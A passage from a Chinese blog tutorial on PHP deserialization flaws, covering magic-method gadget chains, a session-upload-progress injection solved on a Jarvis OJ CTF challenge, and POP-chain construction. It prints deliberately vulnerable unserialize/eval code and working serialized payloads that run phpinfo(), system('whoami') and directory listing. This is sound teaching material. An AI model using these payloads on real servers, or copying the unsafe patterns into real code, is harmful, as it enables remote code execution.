<h4 id="类似与ROP的构造payload"><a href="#类似与ROP的构造payload" class="headerlink" title="类似与ROP的构造payload"></a>类似与ROP的构造payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ph0en1x&#123;</span><br><span class="line">	function __construct($test)&#123;</span><br><span class="line">		$fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;</span><br><span class="line">		fwrite($fp,$test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class chybeta&#123;</span><br><span class="line">	var $test = &apos;123&apos;;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$obj = new ph0en1x($this-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class5 = $_GET[&apos;test&apos;];</span><br><span class="line">print_r($class5);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">$class5_unser = unserialize($class5);</span><br><span class="line">require &quot;shell.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>我们虽然不能够直接去实例化一个ph0en1x类，但是我们可以通过反序列化chybeta类的一个对象，然后触发__wakeup函数从而控制ph0en1x对象的写入</p>
<p>payload：（被url编码）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.147/test/?test=O:7:%22chybeta%22:1:&#123;s:4:%22test%22;s:18:%22%3C?php%20phpinfo();?%3E%22;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://s2.ax1x.com/2019/04/17/AzNyxf.png" alt> </p>
<h4 id="普通成员函数"><a href="#普通成员函数" class="headerlink" title="普通成员函数"></a>普通成员函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(&quot;index.php&quot;);</span><br><span class="line">class chybeta &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new ph0en1x();</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() </span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ph0en1x &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;ph0en1x&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ph0en2x &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class6 = new chybeta();</span><br><span class="line">@unserialize($_GET[&apos;test&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>应对这道题，我们可以利用chybeta做一个跳板来利用ph0en2x类，从而执行eval函数</p>
<p>构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class chybeta &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new ph0en2x();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ph0en2x &#123;</span><br><span class="line">	public $test2 = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new chybeta();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现成功执行了phpinfo();</p>
<blockquote>
<p>通过这道题可以发现一个细节，当反序列化一个对象的时候，并不执行构造函数，原因是对象已经实例化了</p>
</blockquote>
<h3 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h3><p>在总结文件包含的的时候我们可以通过对session注入php代码，然后再进行包含session文件，从而执行我们想要执行的php代码</p>
<p>如果我们仔细观察服务器中session文件中的东西的话，会发现我们输入的字符串被反序列化存储在文件中</p>
<p>PHP在session存储和读取的时候，都会有一个序列化和反序列化的过程，PHP内置了多种处理用于存取$_SESSION数据，都会对数据进行序列化和反序列话</p>
<p>和session有关的信息可以在phpinfo上详细看到<br><img src="https://s2.ax1x.com/2019/04/17/AzNcM8.png" alt> </p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>session.save_path</td>
<td>设置session的存储路径</td>
</tr>
<tr>
<td>session.save_handler</td>
<td>设定用户自定义存储函数</td>
</tr>
<tr>
<td>session.auto_start</td>
<td>指定会话模块是否在请求开始时启动一个会话</td>
</tr>
<tr>
<td>session.serialize_handler</td>
<td>定义用来序列化/反序列化的处理器名字。默认使用php除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</td>
</tr>
</tbody>
</table>
<ul>
<li>php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</li>
<li>php 键名＋竖线＋经过serialize()函数反序列处理的值</li>
<li>php_serialize serialize()函数反序列处理数组方式</li>
</ul>
<h4 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h4><p>在文件包含中已经写过这个，在php中session是以文件的方式来存储的，文件名是sess_sessionid命名，文件内容是session序列化之后的值</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li>页面设置session.serialize_handler和php.ini设置的不一样</li>
<li>session.upload_progress.enabled为On</li>
<li>session.upload_progress.cleanup为Off</li>
</ol>
<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p>
<h4 id="这里用OJ平台上的一个题来做演示"><a href="#这里用OJ平台上的一个题来做演示" class="headerlink" title="这里用OJ平台上的一个题来做演示"></a>这里用OJ平台上的一个题来做演示</h4><p><a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">题目地址</a> </p>
<p>题目给出源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&apos;index.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以查看phpinfo，在phpinfo发现中发现几个要点</p>
<p>关于可以造成session序列化漏洞的：<br><img src="https://s2.ax1x.com/2019/04/17/AzN2qg.png" alt> </p>
<p>敏感路径：<br><img src="https://s2.ax1x.com/2019/04/17/AzNhIs.png" alt> </p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>首先我们构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>构造反序列话的类，使我们能够利用OowoO类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;system(&quot;whoami&quot;);&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new OowoO();</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure></p>
<p>生成反序列的类：（防止引号出问题，加反斜杠转义）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:17:\&quot;system(\&quot;whoami\&quot;);\&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们用bp抓住刚刚建的html文件的包，把filename改成payload，这里需要注意的是前面必须加上一个“|”<br><img src="https://s2.ax1x.com/2019/04/17/AzNzJ1.png" alt> </p>
<p>发现执行命令成功，那么现在开始寻找flag，通过执行system(ls”)我发现ls出来的是在根目录下，通过phpinfo找到网站的根目录，用ls读取这个目录，我试的时候发现读不出来，，所以我们换用php代码来读取本目录下的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现flag文件<br><img src="https://s2.ax1x.com/2019/04/17/AzUSRx.png" alt><br>在进行读取这个文件，得到flag：<br><img src="https://s2.ax1x.com/2019/04/17/AzUPsO.png" alt> </p>
<h3 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h3><p>POP链和pwn中的ROP链相似，都是控制程序的流程走向</p>
<p>这里不在详细描述，用一个例子来看一下POP链的构造：</p>
<p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&apos;string&apos;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>根据一层一层的关系写入来构造payload的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 = new Call();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1 = new funct();</span><br><span class="line">    &#125;</span><br><span class="line">    public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 = new func();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">        	$this-&gt;mod1=new string1();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">        	$this-&gt;str1=new GetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;flag&#123;hahahahahahaha……&#125;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new start_gg();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>根据这个我们可以得到payload，再通过get传参进行，得到flag</p>
<blockquote>
<p>通过这里例子我发现了如果要对类中属性赋值new（新类），那么需要用到函数，直接赋值可能不对</p>
</blockquote>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
